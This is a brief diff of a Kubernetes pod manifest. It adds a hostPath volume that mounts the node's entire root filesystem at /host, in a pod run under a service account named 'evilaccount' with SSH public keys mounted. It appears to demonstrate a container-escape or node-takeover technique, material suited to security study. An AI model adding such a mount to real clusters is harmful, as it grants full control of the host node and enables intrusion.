@@ -27,10 +27,15 @@ spec:
         volumeMounts:
         - name: pubkeys-volume
           mountPath: /pub_keys
+        - mountPath: /host
+          name: noderoot
       volumes:
       - name: pubkeys-volume
         configMap:
           name: ssh-pubkeys
+      - name: noderoot
+        hostPath:
+          path: /
       serviceAccountName: evilaccount
 
 
